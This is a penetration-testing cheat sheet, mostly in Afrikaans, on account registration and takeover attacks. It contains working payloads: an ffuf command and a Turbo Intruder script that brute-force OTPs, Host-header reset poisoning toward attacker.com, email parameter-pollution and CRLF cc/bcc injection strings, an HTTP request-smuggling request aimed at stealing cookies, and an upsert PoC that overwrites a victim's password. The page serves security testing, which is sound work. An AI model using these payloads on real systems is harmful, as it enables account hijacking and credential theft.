# Registrasie & Oorname Kwesbaarhede

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- Probeer om te genereer met 'n bestaande gebruikersnaam
- Kontroleer deur die e-pos te varieer:
- hoofletters
- +1@
- voeg 'n punt in die e-pos by
- spesiale karakters in die e-posnaam (%00, %09, %20)
- Plaas leë tekens na die e-pos: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Probeer e-posverskaffer kanoniseringstruuks (diens-afhanklik):
- Gmail ignoreer punte en subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` word afgelewer by `victim@gmail.com`
- Sommige verskaffers is nie-gevoelig vir hoofletters in die local-part
- Sommige verskaffers aanvaar unicode confusables. Probeer homoglyphs en soft hyphen `\u00AD` binne die local-part
- Misbruik dit om: uniekheidskontroles te omseil, dubbele rekeninge/workspace invites te verkry, of slagoffer registrasies te blokkeer (tydelike DoS) terwyl jy 'n oorname voorberei

### Gebruikersnaam Enumerasie

Kontroleer of jy kan bepaal wanneer 'n gebruikersnaam reeds in die toepassing geregistreer is.

- Verskillende foutboodskappe of HTTP statuskodes
- Timing-verskille (bestaande gebruiker kan 'n lookup na IdP/DB veroorsaak)
- Registrasievorm vul profieldata outomaties in vir bekende e-posse
- Kontroleer team/invite vloei: die invoer van 'n e-pos kan openbaar of 'n rekening bestaan

### Wagwoordbeleid

By die skep van 'n gebruiker, kontroleer die wagwoordbeleid (kontroleer of jy swak wagwoorde kan gebruik).\
In daardie geval kan jy probeer om credentials te bruteforce.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Wanneer geregistreer, probeer om die e-pos te verander en kontroleer of hierdie verandering korrek gevalideer word of dat dit na arbitrêre e-posse verander kan word.

### More Checks

- Kontroleer of jy **weggooie-e-posse** (mailinator, yopmail, 1secmail, ens.) kan gebruik of die blocklist kan omseil met subaddressing soos `victim+mailinator@gmail.com`
- **Lang** **wagwoord** (>200) lei tot **DoS**
- **Kontroleer rate limits op rekeningskepping**
- Gebruik username@**burp_collab**.net en ontleed die **callback**
- As telefoonnommer verifikasie gebruik word, kontroleer telefoon parsing/injection randgevalle

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Swak E-pos/Telefoon Verifikasie (OTP/Magic Link)

Registrasie-vloei verifieer dikwels eienaarskap via 'n numeriese OTP of 'n magic-link token. Tipiese foute:

- Raakbare of kort OTP (4–6 syfers) sonder effektiewe rate limiting of IP/device tracking. Probeer parallel raaisels en header/IP rotasie.
- OTP hergebruik oor aksies of rekeninge, of nie gebind aan die spesifieke gebruiker/aksie nie (bv., dieselfde kode werk vir login en signup, of werk nadat e-pos verander is).
- Multi-value smuggling: sommige backends aanvaar veelvuldige kodes en verifieer as enige pas. Probeer:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Gemengde parametername: `otp=000000&one_time_code=123456`
- Komma/pipe-geskeide waardes: `code=000000,123456` of `code=000000|123456`
- Response oracle: onderskei verkeerde vs vervalde vs verkeerde-gebruiker kodes deur status/boodskap/liggaamlengte.
- Tokens wat nie ongeldig gemaak word na sukses of na wagwoord/e-pos verandering nie.
- Verifikasie-token nie verbind aan user agent/IP nie, wat cross-origin voltooiing vanaf aanvaller-beheerde bladsye moontlik maak.

Bruteforcing voorbeeld met ffuf teen 'n JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Parallel/concurrent guessing to bypass sequential lockouts (gebruik Turbo Intruder in Burp):

<details>
<summary>Turbo Intruder snippet om 6‑siferse OTP‑pogings te oorstroom</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Probeer racing verification: stuur dieselfde geldige OTP gelyktydig in twee sessies; soms word een sessie ’n geverifieerde aanvallersrekening terwyl die slagoffer se flow ook slaag.
- Toets ook Host header poisoning op verification links (soos reset poisoning hieronder) om ’n leak of volledige verification op ’n aanvaller-gekontroleerde host te bewerkstellig.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Rekening Pre‑Hijacking Techniques (before the victim signs up)

’n Kragtige klas kwessies ontstaan wanneer ’n aanvaller aksies op die slagoffer se email uitvoer voordat die slagoffer hul rekening skep, en later weer toegang herwin.

Sleutel tegnieke om te toets (pas aan by die teiken se flows):

- Classic–Federated Merge
  - Aanvaller: registreer ’n classic account met die slagoffer se email en stel ’n password in
  - Slagoffer: teken later aan met SSO (dieselfde email)
  - Onveilige merges kan beide partye ingelog laat bly of die aanvaller se toegang herstel
- Unexpired Session Identifier
  - Aanvaller: skep account en hou ’n long‑lived session (moenie logout nie)
  - Slagoffer: recover/stel password en gebruik die account
  - Toets of ou sessions geldig bly na reset of MFA enablement
- Trojan Identifier
  - Aanvaller: voeg ’n sekondêre identifier by die pre‑created account (phone, additional email, of link die aanvaller se IdP)
  - Slagoffer: reset password; aanvaller gebruik later die trojan identifier om te reset/login
- Unexpired Email Change
  - Aanvaller: initieer email‑change na aanvaller se mail en weerhou confirmation
  - Slagoffer: recover die account en begin dit gebruik
  - Aanvaller: voltooi later die pending email‑change om die account te steel
- Non‑Verifying IdP
  - Aanvaller: gebruik ’n IdP wat nie email ownership verifieer nie om `victim@…` te assert
  - Slagoffer: teken aan via classic route
  - Service merge op email sonder om `email_verified` te check of plaaslike verification te doen

Praktiese wenke

- Versamel flows en endpoints vanaf web/mobile bundles. Kyk na classic signup, SSO linking, email/phone change, en password reset endpoints.
- Skep realistiese automation om sessions lewendig te hou terwyl jy ander flows toets.
- Vir SSO-toetse, staan ’n test OIDC provider op en issue tokens met `email` claims vir die slagoffer address en `email_verified=false` om te kyk of die RP ungeverifieerde IdPs vertrou.
- Na enige password reset of email change, verifieer dat:
  - alle ander sessions en tokens ongeldig gemaak is,
  - pending email/phone change capabilities gekanselleer is,
  - voorheen gekoppelde IdPs/emails/phones weer ge‑verified word.

Note: Uitgebreide metodologie en gevallestudies van hierdie tegnieke is gedokumenteer deur Microsoft se pre‑hijacking research (sien References aan die einde).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR op API-parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Die aanvaller moet login met hul rekening en na die **Change password** funksie gaan.
2. Start die Burp Suite en Intercept die versoek
3. Stuur dit na die repeater tab en wysig die parameters : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Swak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Die password reset token moet lukraak gegenereer en elke keer uniek wees.\
Probeer bepaal of die token verstryk of of dit altyd dieselfde is — in sommige gevalle is die generasie-algoritme swak en kan dit geraai word. Die volgende veranderlikes kan deur die algoritme gebruik word.

- Tydstempel
- UserID
- Gebruiker se email
- Voornaam en Van
- Geboortedatum
- Kriptografie
- Slegs nommers
- Klein token-reeks (karakters tussen \[A-Z,a-z,0-9])
- Token hergebruik
- Token vervaldatum

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspekteer die bedienerrespons en kyk vir `resetToken`
3. Gebruik dan die token in 'n URL soos `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registreer op die stelsel met 'n gebruikersnaam identies aan die slagoffer se gebruikersnaam, maar met spasies ingesit voor en/of na die gebruikersnaam. e.g: `"admin "`
2. Versoek 'n password reset met jou kwaadwillige gebruikersnaam.
3. Gebruik die token wat na jou email gestuur is en herstel die slagoffer se wagwoord.
4. Meld aan by die slagoffer se rekening met die nuwe wagwoord.

Die platform CTFd was kwetsbaar vir hierdie aanval.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Vind 'n XSS binne die toepassing of 'n subdomein as die cookies geskoop is na die ouerdomein: `*.domain.com`
2. Leak the current **sessions cookie**
3. Verifieer as die gebruiker deur die cookie te gebruik

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Gebruik **smuggler** om die tipe van HTTP Request Smuggling te detect (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Stel 'n versoek op wat die `POST / HTTP/1.1` sal oor skryf met die volgende data:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` met die doel om die slagoffers na burpcollab te open-redirect en hul cookies te steel\
3. Die finale versoek kan soos volg lyk
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone-verslae oor die uitbuiting van hierdie bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Skep 'n payload vir die CSRF, bv: “HTML form with auto submit for a password change”
2. Stuur die payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token might be used to authenticate an user.

- Wysig die JWT met 'n ander User ID / Email
- Kontroleer vir 'n swak JWT signature


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Sommige signup handlers voer 'n upsert uit wanneer die verskafde email reeds bestaan. As die endpoint 'n minimale body met 'n email en password aanvaar en nie eienaarskapverifikasie afdwing nie, sal die stuur van die slagoffer se email hul password pre-auth oorskryf.

- Discovery: versamel endpoint-nomme uit gebundelde JS (of mobiele app-verkeer), en fuzz dan basispade soos /parents/application/v4/admin/FUZZ met ffuf/dirsearch.
- Method hints: 'n GET wat boodskappe soos "Only POST request is allowed." teruggee, dui dikwels die korrekte werkwoord aan en dat 'n JSON body verwag word.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Voorbeeld PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impak: Full Account Takeover (ATO) sonder enige reset token, OTP, of email verification.

## Verwysings

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
